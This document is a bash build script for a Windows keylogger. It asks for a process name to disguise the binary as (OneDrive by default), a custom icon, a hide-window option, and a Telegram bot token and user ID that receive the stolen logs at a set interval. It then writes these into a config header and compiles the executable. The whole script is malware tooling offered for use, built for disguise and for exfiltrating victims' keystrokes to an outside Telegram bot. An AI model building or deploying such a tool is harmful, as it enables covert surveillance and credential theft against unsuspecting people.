#!/bin/bash

max_key_len=20

purple='\033[0;35m'
reset='\033[0m'
green='\033[0;32m'
yellow='\033[1;33m'
red='\033[0;31m'
cyan='\033[0;36m'

print_row() {
    local key=$1
    local value=$2
    printf "${purple}║ %-*s : %-*s ${reset}\n" $max_key_len "$key" 30 "$value"
}

spacer() {
    echo -e "\n"
}

logo() {
    clear
    spacer
    echo -e "${green}"
    echo -e "  ██▓    ██▓     ▒█████    ▄████     █    ██ "
    echo -e " ▓██▒   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒    ██  ▓██▒"
    echo -e " ▒██▒   ▒██░    ▒██░  ██▒▒██░▄▄▄░   ▓██  ▒██░"
    echo -e " ░██░   ▒██░    ▒██   ██░░▓█  ██▓   ▓▓█  ░██░"
    echo -e " ░██░   ░██████▒░ ████▓▒░░▒▓███▀▒   ▒▒█████▓ "
    echo -e " ░▓     ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒    ░▒▓▒ ▒ ▒ "
    echo -e "  ▒ ░   ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░    ░░▒░ ░ ░ "
    echo -e "  ▒ ░     ░ ░   ░ ░ ░ ▒  ░ ░   ░     ░░░ ░ ░ "
    echo -e "  ░         ░  ░    ░ ░        ░       ░     "
    echo -e "${reset}"
}

ask_yes_no() {
    local prompt="$1"
    local default="$2"
    local answer

    while true; do
        if [ "$default" == "y" ]; then
            read -rp "$prompt [Y/n]: " answer
            answer=${answer:-y}
        elif [ "$default" == "n" ]; then
            read -rp "$prompt [y/N]: " answer
            answer=${answer:-n}
        else
            read -rp "$prompt [y/n]: " answer
        fi

        case "$answer" in
            [Yy]*) echo "true"; return ;;
            [Nn]*) echo "false"; return ;;
            *) echo -e "${red}Please enter y or n.${reset}" >&2 ;;
        esac
    done
}

ask_input() {
    local prompt="$1"
    local default="$2"
    local input

    if [ -n "$default" ]; then
        read -rp "$prompt [$default]: " input
        input=${input:-$default}
    else
        read -rp "$prompt: " input
    fi
    echo "$input"
}

logo

spacer

echo -e "${green}For realism, edit version.rs the file. OneDrive is used by default.${reset}"

echo -e "${cyan}Let's configure your keylogger build! Please enter the required information.${reset}"

while true; do
    process_name=$(ask_input "Enter the process name for masquerading (default: OneDrive)" "OneDrive")
    if [[ "$process_name" =~ ^[a-zA-Z0-9._-]+$ ]]; then
        break
    else
        echo -e "${red}Invalid process name. Use only letters, numbers, dot, underscore, dash.${reset}"
    fi
done

while true; do
    path_to_ico=$(ask_input "Enter path to icon file (.ico), or leave empty for default" "")
    if [ -z "$path_to_ico" ] || [ -f "$path_to_ico" ]; then
        break
    else
        echo -e "${red}File not found at path: $path_to_ico${reset}"
    fi
done

log_to_file=$(ask_yes_no "Save data to file?" "y")

hide_window=$(ask_yes_no "Hide debug window?" "n")

log_to_console=$(ask_yes_no "Print output to console?" "y")

while true; do
    wait_time=$(ask_input "Enter the time interval in minutes after which the log will be sent (min 1)" "5")
    if [[ "$wait_time" =~ ^[0-9]+$ ]] && [ "$wait_time" -ge 1 ]; then
        break
    else
        echo -e "${red}Please enter a valid positive integer (1 or higher).${reset}"
    fi
done

bot_token=""
while [ -z "$bot_token" ]; do
    bot_token=$(ask_input "Enter the Telegram bot token (Use a bot you don't mind losing)")
    if [ -z "$bot_token" ]; then
        echo -e "${red}Bot token can't be empty.${reset}"
    fi
done

tg_user_id=""
while ! [[ "$tg_user_id" =~ ^[0-9]+$ ]]; do
    tg_user_id=$(ask_input "Enter your Telegram user ID (numeric)")
    if ! [[ "$tg_user_id" =~ ^[0-9]+$ ]]; then
        echo -e "${red}User ID must be a numeric value.${reset}"
    fi
done

spacer

echo -e "${purple}╔═════════════════════════════════════════════════════════════════"
echo -e "${purple}║                          Your options                          "
echo -e "${purple}╠═════════════════════════════════════════════════════════════════"
print_row "Process name" "$process_name"
print_row "Log to file" "$log_to_file"
print_row "Show debug window" "$hide_window"
print_row "Log to console" "$log_to_console"
print_row "Wait time (minutes)" "$wait_time"
print_row "Bot token (hidden)" "************"
print_row "User ID" "$tg_user_id"
echo -e "${purple}╚═════════════════════════════════════════════════════════════════${reset}"

spacer

confirm_build=$(ask_yes_no "Start build?" "y")
if [ "$confirm_build" != "true" ]; then
    echo -e "${yellow}Build cancelled by user.${reset}"
    exit 0
fi

logo
spacer

echo -e "${cyan}Generating configuration...${reset}"

{
    echo "#pragma once"
    echo "#include <string>"
    echo "const bool           logToFile     = $log_to_file;"
    echo "const bool           logToConsole  = $log_to_console;"
    echo "const bool           hideWindow    = $hide_window;"
    echo "const int            waitTime      = $wait_time;"
    echo "const std::wstring   botToken      = L\"$bot_token\";"
    echo "const std::wstring   userID        = L\"$tg_user_id\";"
} > src/config.h || { echo -e "${red}Error writing config.h${reset}"; exit 1; }

if [ -z "$path_to_ico" ]; then
    if [ -f src/resources/icon_d.ico ]; then
        cp -f src/resources/icon_d.ico src/resources/icon.ico
        echo -e "${green}Using default icon (icon_d.ico copied to icon.ico).${reset}"
    else
        echo -e "${red}Default icon src/resources/icon_d.ico not found!${reset}"
        exit 1
    fi
else
    cp -f "$path_to_ico" src/resources/icon.ico
    echo -e "${green}Icon $path_to_ico copied to src/resources/icon.ico.${reset}"
fi

cd src || { echo -e "${red}Failed to enter src directory.${reset}"; exit 1; }

echo -e "${cyan}Cleaning previous build artifacts...${reset}"
make clean

echo -e "${cyan}Starting build of keylogger executable ${process_name}.exe ...${reset}"
if make TARGET=${process_name}.exe; then
    echo -e "${green}Build completed successfully.${reset}"
    rm -f config.h

    clear

    echo -e "${green}"
    echo "  ______                                     __             __               "
    echo " /      \\                                   |  \\           |  \\              "
    echo "|  888888\\  ______   ______ ____    ______  | 88  ______  _| 88_     ______  "
    echo "| 88   \\88 /      \\ |      \\    \\  /      \\ | 88 /      \\|   88 \\   /      \\ "
    echo "| 88      |  888888\\| 888888\\8888\\|  888888\\| 88|  888888\\\\888888  |  888888"
    echo "| 88   __ | 88  | 88| 88 | 88 | 88| 88  | 88| 88| 88    88 | 88 __ | 88    88"
    echo "| 88__/  \\| 88__/ 88| 88 | 88 | 88| 88__/ 88| 88| 88888888 | 88|  \\| 88888888"
    echo " \\88    88 \\88    88| 88 | 88 | 88| 88    88| 88 \\88     \\  \\88  88 \\88      "
    echo "  \\888888   \\888888  \\88  \\88  \\88| 8888888  \\88  \\8888888   \\8888   \\8888888"
    echo "                                  | 88                                       "
    echo "                                  | 88                                       "
    echo "                                   \\88                                       "
    echo -e "${reset}"

    spacer

    if [ -f "${process_name}.exe" ]; then
        echo -e "${green}YOUR KEYLOGGER: ${reset}"
        echo -e "${purple}$(realpath ${process_name}.exe)${reset}"
    else
        echo -e "${red}File '${process_name}.exe' was not found after build!${reset}"
    fi
else
    echo -e "${red}Build failed. See errors below:${reset}"
    make TARGET=${process_name}.exe 2>&1 | tee /dev/stderr
    exit 1
fi
